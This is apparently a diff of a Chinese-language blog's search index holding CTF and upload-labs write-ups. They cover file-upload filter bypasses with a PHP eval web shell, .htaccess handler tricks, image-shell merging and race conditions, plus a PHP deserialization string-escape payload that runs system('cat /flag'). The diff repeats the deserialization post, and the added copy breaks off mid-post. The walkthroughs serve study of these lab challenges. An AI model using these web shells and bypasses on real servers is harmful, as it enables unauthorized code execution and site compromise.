-<h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>1.上传内容为<code>&lt;?php eval($_POST[&#39;a&#39;]); ?&gt;</code>的php文件显示**Not image!**，那就修改Content-Type处为image&#x2F;jpeg</p>
-<p>2.修改以后继续上传回显NOT!php!意思应该是不能上传后缀为php文件，那就使用.phtml来代替.php</p>
-<p>3.上传.phtml文件后显示不能包含&lt;?，所以使用<code>&lt;script language=&quot;php&quot;&gt;  eval($_POST[&#39;a&#39;]); &lt;/script&gt;</code></p>
-<p>4.修改了Content-Type，又使用了phtml，又跳过了&lt;?的过滤，上传文件后又显示了<code>内容不全是图片</code>,使用图片头文件欺骗为<code>GIF89a</code>,使用<code>GIF89a</code></p>
-<p><code>&lt;script language=&quot;php&quot;&gt;  eval($_POST[&#39;a&#39;]); &lt;/script&gt;</code></p>
-<p>5.发现上传成功，使用hackbar在post处使用a&#x3D;system(‘cat &#x2F;flag’);获得flag</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>upload-labs关卡</title>
-    <url>/2022/11/19/upload-labs/</url>
-    <content><![CDATA[<p>简介</p>
-<span id="more"></span>
-
-<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>js绕过<br>只允许上传.jpg|.png|.gif后缀的文件<br>那就上传.gif的文件<br>使用burp抓包<br>在burp里修改后缀.gif为.php然后执行</p>
-<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>mime头检测(会自动检测文件类型)<br>上传.php后缀的文件<br>使用burp抓包里面的Content-Type是来标识该文件是个什么类型的文件（php还是jpg或者gif等等)<br>将Content-Type后改为image&#x2F;jpeg让代码以为上传的php文件是可以通过的文件<br>然后放包</p>
-<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>源代码$deny_ext &#x3D; array(‘.asp’,’.aspx’,’.php’,’.jsp’);这个意思是.asp .aspx .php .jsp的文件都不能上传，如果检测到就进行拦截。<br>使用不常见的后缀，比如.php3 .php2等等</p>
-<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>源代码$deny_ext &#x3D; array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”)<br>这条语句几乎将不常用的后缀都已经拦截<br>所以上传.htaccess文件，让他把任何文件都当做”.php”去读取，这就是.htaccess的功能<br>写入.htacess文件一下内容<br>&lt;FilesMatch “jpg”&gt;&#x2F;&#x2F;为指定上传的文件后缀起作用<br>SetHandler application&#x2F;x-httpd-php&#x2F;&#x2F;是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错<br><br>然后再上传一个jpg后缀的文件就可以了</p>
-<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>方法一(?)<br>除了拦截的后缀的第四关一样又拦截了.htaccess<br>但源代码里没有循环，这些语句只会执行一次<br>在burp里进行修改为xx.php. .再放包<br>只要保证有两个分开的点就行了演示过程中是最简的方法，两个点放在一起会被防护规则同时删除掉<br>由于Windows系统的命名规则，无论你后缀有多少个空格和点他都会给你自动删除掉<br>方法二<br>源代码里没有了转换为小写<br>上传.php文件后<br>再burp中改为.phP<br>直接放包</p>
-<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关(?)"></a>第六关(?)</h3><p>源代码里没有了首尾去空，可以上传.php文件然后用burp抓包<br>在burp中在.php后加一个空格然后再放包</p>
-<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>源代码里没有了删除文件名末尾的点<br>上传.php文件后<br>再burp中改为.php.<br>直接放包</p>
-<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>源代码中没有了去除字符串::$DATA<br>上传.php文件后<br>再burp中改为.php::$DATA<br>直接放包</p>
-<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>上传.php文件<br>使用burp抓包<br>然后在burp里修改为.php. .<br>最后放包</p>
-<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>上传.php文件<br>使用burp抓包<br>然后在burp里修改为.pphphp<br>最后放包</p>
-<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关(?)"></a>第十一关(?)</h3><h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关(?)"></a>第十二关(?)</h3><h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h3><p>将一个.php文件个一个.jpg文件和成一个.jpg文件<br>在cmd中使用copy &#x2F;b xx.jpg+xx.php&#x3D;xx.jpg<br>使用burp抓包<br>进行发送</p>
-<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关(?)"></a>第十六关(?)</h3><p>二次渲染</p>
-<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>条件竞争<br>上传.php文件<br>进入intruder进行攻击<br>然后在positions中将§<?php phpinfo();?>§修改为§<?php phpinfo();?>§1§<br>然后进入payloads中进行循环攻击10000次<br>最后直接询问网站</p>
-<h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p>图片型的条件竞争<br>上传.jpg文件进入intruder进行攻击<br>然后在positions中将§<?php phpinfo();?>§修改为§<?php phpinfo();?>§1§<br>然后进入payloads中进行循环攻击10000次<br>最后直接询问网站</p>
-<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p>该题在网页上不仅可以上传文件还可以修改文件名称<br>上传.php文件<br>然后在网页上将文件名修改为.PHP然后进行上传<br>直接访问网页</p>
-<h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关(?)"></a>第二十关(?)</h3>]]></content>
-  </entry>
-  <entry>
-    <title>反序列化逃逸</title>
-    <url>/2022/12/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
-    <content><![CDATA[<p>字符减少型</p>
-<span id="more"></span>
-
-<p>源码是</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a*a&#x27;</span>, <span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>))));</span><br></pre></td></tr></table></figure>
-
-<p>刚打开有一个回显<code>object(UserAccount)#1 (2) &#123; [&quot;username&quot;:protected]=&gt; NULL [&quot;password&quot;:protected]=&gt; NULL &#125;</code></p>
-<p>看到最后有unserialize函数，可以反序列化，反序列化前还有自定义的函数<code>object_weakup</code>和<code>object_sleep</code>会起作用，看着两个函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function object_sleep($str)</span><br><span class="line">&#123;</span><br><span class="line">    $ob = str_replace(&#x27;a*a&#x27;, &#x27;@0@0@0@0@&#x27;, $str);</span><br><span class="line">    return $ob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function object_weakup($ob)</span><br><span class="line">&#123;</span><br><span class="line">    $r = str_replace(&#x27;@0@0@0@0@&#x27;, &#x27;a*a&#x27;, $ob);</span><br><span class="line">    return $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>object_sleep</code>会把<code>a*a</code>换为<code>@0@0@0@0@</code>，而<code>object_weakup</code>会把<code>@0@0@0@0@</code>换为<code>a*a</code>如果传入的有<code>a*a</code>，那么经过这两个函数的作用会相互抵消，就没有任何作用，但如果传入的是<code>@0@0@0@0@</code>，<code>object_sleep</code>函数就不会起作用，而是<code>object_sleep</code>会起作用，会使字符串减少，这就可以使用反序列化的字符串逃逸</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class order</span><br><span class="line">&#123;</span><br><span class="line">    public $f;</span><br><span class="line">    public $hint;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        eval($this-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">$user = serialize(new UserAccount($username, $password));</span><br></pre></td></tr></table></figure>
-
-<p>但是我们可以利用的是username和password，需要靠<code>eval($this-&gt;f);</code>来获得flag，没办法直接给order类的f属性传参，这就需要靠字符串逃逸了</p>
-<p>先讲一下字符串减少的逃逸</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="string">&#x27;@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&#x27;</span>, <span class="string">&#x27;111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>a*aa*aa*aa*aa*a<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>本来给username赋值的是<code>@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@</code>，给password赋值的是<code>111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;</code>，但经过字符串减少的函数后username的值就变成了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:38:&quot;111</code>，password的值就成了123，而这个123就相当于逃逸出来，我们可以自己控制，只需要改变<code>s:3:&quot;123&quot;;</code>这里</p>
-<p>所以这个题就可以让后面逃逸出来给f属性进行传参，需要的f值是<code>system(&quot;cat /flag&quot;);</code>，需要让password的值传为<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>，这样就可以给order类中的f属性进行赋值，但是如果直接给password传这个值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new UserAccount(&#x27;123&#x27;, &#x27;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>那么序列化之后只会把这个值当作一个字符串看待，不会把它当作一个类，需要将这个值单独逃逸出来</p>
-<p>最终的payload可以是这样</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&amp;password=123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样进行字符串减少后就成了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;UserAccount&quot;:2:&#123;s:11:&quot; * username&quot;;s:45:&quot;a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>就相当于给username赋值了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123</code>，给password赋值了一个类，而不是一个字符串，<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>被当作类来处理从而给f属性进行赋值，最后利用<code>eval</code>来得到flag</p>
 ]]></content>
   </entry>
   <entry>
@@ -1532,6 +1552,40 @@
 ]]></content>
   </entry>
   <entry>
+    <title>反序列化逃逸</title>
+    <url>/2022/12/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
+    <content><![CDATA[<p>字符减少型</p>
+<span id="more"></span>
+
+<p>源码是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a*a&#x27;</span>, <span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>))));</span><br></pre></td></tr></table></figure>
+
+<p>刚打开有一个回显<code>object(UserAccount)#1 (2) &#123; [&quot;username&quot;:protected]=&gt; NULL [&quot;password&quot;:protected]=&gt; NULL &#125;</code></p>
+<p>看到最后有unserialize函数，可以反序列化，反序列化前还有自定义的函数<code>object_weakup</code>和<code>object_sleep</code>会起作用，看着两个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function object_sleep($str)</span><br><span class="line">&#123;</span><br><span class="line">    $ob = str_replace(&#x27;a*a&#x27;, &#x27;@0@0@0@0@&#x27;, $str);</span><br><span class="line">    return $ob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function object_weakup($ob)</span><br><span class="line">&#123;</span><br><span class="line">    $r = str_replace(&#x27;@0@0@0@0@&#x27;, &#x27;a*a&#x27;, $ob);</span><br><span class="line">    return $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>object_sleep</code>会把<code>a*a</code>换为<code>@0@0@0@0@</code>，而<code>object_weakup</code>会把<code>@0@0@0@0@</code>换为<code>a*a</code>如果传入的有<code>a*a</code>，那么经过这两个函数的作用会相互抵消，就没有任何作用，但如果传入的是<code>@0@0@0@0@</code>，<code>object_sleep</code>函数就不会起作用，而是<code>object_sleep</code>会起作用，会使字符串减少，这就可以使用反序列化的字符串逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class order</span><br><span class="line">&#123;</span><br><span class="line">    public $f;</span><br><span class="line">    public $hint;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        eval($this-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">$user = serialize(new UserAccount($username, $password));</span><br></pre></td></tr></table></figure>
+
+<p>但是我们可以利用的是username和password，需要靠<code>eval($this-&gt;f);</code>来获得flag，没办法直接给order类的f属性传参，这就需要靠字符串逃逸了</p>
+<p>先讲一下字符串减少的逃逸</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="string">&#x27;@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&#x27;</span>, <span class="string">&#x27;111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>a*aa*aa*aa*aa*a<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>本来给username赋值的是<code>@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@</code>，给password赋值的是<code>111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;</code>，但经过字符串减少的函数后username的值就变成了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:38:&quot;111</code>，password的值就成了123，而这个123就相当于逃逸出来，我们可以自己控制，只需要改变<code>s:3:&quot;123&quot;;</code>这里</p>
+<p>所以这个题就可以让后面逃逸出来给f属性进行传参，需要的f值是<code>system(&quot;cat /flag&quot;);</code>，需要让password的值传为<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>，这样就可以给order类中的f属性进行赋值，但是如果直接给password传这个值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new UserAccount(&#x27;123&#x27;, &#x27;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+
